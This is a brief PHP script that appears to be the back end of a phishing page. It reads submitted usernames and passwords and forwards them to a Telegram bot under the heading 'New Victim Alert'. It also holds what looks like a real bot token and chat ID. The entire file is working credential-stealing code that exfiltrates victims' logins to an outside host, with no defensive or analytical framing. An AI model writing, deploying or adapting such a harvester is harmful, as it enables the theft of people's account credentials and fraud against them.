<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $token = "7986028196:AAETiXo58eCf4_2Wh4PgnNwMX-AjQ3XENao"; // Replace with your Telegram Bot Token
    $chat_id = "1559369377"; // Replace with your Telegram Chat ID

    $username = $_POST['username'];
    $password = $_POST['password'];

    $message = "🔥 New Victim Alert 🔥\nUsername: $username\nPassword: $password";

    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=".urlencode($message);

    file_get_contents($url);
}
?>
